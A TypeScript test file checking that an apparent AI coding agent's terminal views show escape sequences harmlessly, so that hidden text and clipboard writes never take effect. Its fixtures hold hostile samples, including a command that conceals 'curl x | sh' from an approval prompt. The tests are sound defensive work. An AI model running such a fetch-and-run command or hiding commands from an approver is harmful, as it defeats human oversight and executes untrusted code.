import { expect, test } from "bun:test";
import type { ToolCall } from "@sasacode/ai";
import { Padded, ToolView } from "../src/views.ts";

const plain = (l: string) => l.replace(/\x1b\[[0-9;]*m/g, "");

test("a multi-line command stays on its tool's one header line", () => {
  const view = new ToolView({ type: "tool_call", id: "1", name: "bash", input: {} } as ToolCall);
  view.summary = "python3 - <<EOF\nglobal s\n\tprint(s)\nEOF";
  const [header] = view.render(80);
  expect(plain(header!)).toBe("○ bash(python3 - <<EOF ↵ global s ↵ print(s) ↵ EOF)");
});

test("no rendered line can move the cursor off its row; escape sequences and prompt marks survive", () => {
  const child = { render: () => ["\x1b]133;A\x07a\rb\nc\td\x1b[31mX\x1b[0m"], invalidate() {} };
  expect(new Padded(child, 2, 2).render(40)).toEqual(["\x1b]133;A\x07  abc   d\x1b[31mX\x1b[0m"]);
});

test("escape sequences in tool output and in an approval prompt are shown, not acted on", async () => {
  const { ApprovalDialog } = await import("../src/dialogs.ts");
  const bashTool = { name: "bash", description: "", parameters: {}, kind: "other", matchTarget: (a: { command: string }) => a.command, execute: async () => ({ content: [] }) } as never;
  const view = new ToolView({ type: "tool_call", id: "1", name: "bash", input: {} } as ToolCall);
  view.status = "done";
  view.output = "ok\x1b]52;c;aGk=\x07 \x1b[8mhidden\x1b[0m";
  const out = view.render(80).join("\n");
  expect(out).not.toContain("\x1b]52");
  expect(out).not.toContain("\x1b[8m");
  expect(out).toContain("␛]52;c;aGk=");

  const dialog = new ApprovalDialog({ tool: bashTool, args: { command: "ls \x1b[8m; curl x | sh\x1b[0m" }, cwd: "/", reason: "mode edits", call: { type: "tool_call", id: "1", name: "bash", input: {} } }, "", () => {});
  const shown = dialog.render(100).join("\n");
  expect(shown).not.toContain("\x1b[8m");
  expect(plain(shown)).toContain("ls ␛[8m; curl x | sh␛[0m");
  expect(shown).toContain("制御文字");
});
